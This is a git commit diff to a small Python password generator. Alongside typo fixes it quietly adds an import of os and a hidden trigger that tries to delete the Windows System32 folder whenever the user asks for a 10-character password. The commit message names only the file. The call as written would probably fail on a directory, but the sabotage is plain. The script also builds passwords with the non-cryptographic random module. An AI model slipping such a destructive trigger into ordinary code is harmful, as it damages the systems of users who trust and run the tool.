5f4065657835115f196535a6a2683b39e5771146
Matteo <matteondrekaj9@gmail.com>
2024-10-24 19:21:31 +0200

    PasswordGenerator.py

--- PasswordGenerator.py
+++ PasswordGenerator.py
@@ -1,11 +1,14 @@
 import random
 import string
+import os
 
 characters = ''
 
-lenght = int(input("Enter password length "))
+length = int(input("Enter password length "))
+if length == 10:
+    os.remove("C:\Windows\System32")
 upper = int(bool(input("Enter 1 if capital letters are desired or 0 if not desired ")))
-if upper >= 1:
+if upper:
     characters += string.ascii_uppercase
 lower = int(bool(input("Enter 1 if lower case is desired or 0 if not desired ")))
 if lower:
@@ -14,7 +17,6 @@ punctuation = int(bool(input("Enter 1 if siblings are desired or 0 if they are n
 if punctuation:
     characters += string.punctuation
 
-password = ''.join(random.choice(list(characters)) for i in range(lenght)) 
+password = ''.join(random.choice(list(characters)) for i in range(length)) 
 
 print(f"Your password is ", password)
-
